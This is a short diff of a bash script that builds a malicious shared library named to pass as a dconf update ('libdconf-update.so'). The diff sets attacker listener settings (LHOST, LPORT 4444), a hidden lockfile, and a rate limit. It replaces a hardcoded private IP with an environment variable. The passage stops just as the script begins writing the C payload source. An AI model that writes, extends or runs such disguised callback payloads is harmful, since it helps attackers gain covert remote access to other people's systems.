@@ -1,10 +1,15 @@
 #!/usr/bin/env bash
 # --- CONFIGURATION ---
-LHOST="192.168.75.130"
-LPORT="4444"
+LHOST="${LHOST:-}"
+LPORT="${LPORT:-4444}"
 OUT_FILE="libdconf-update.so"
 LOCKFILE="/var/tmp/.dconf-lock"
 RATE_LIMIT=10
+
+if [[ -z "$LHOST" ]]; then
+    echo "[-] LHOST is not set. Export it before running."
+    exit 1
+fi
 
 # --- GENERATE C SOURCE ---
 cat <<EOF > payload.c
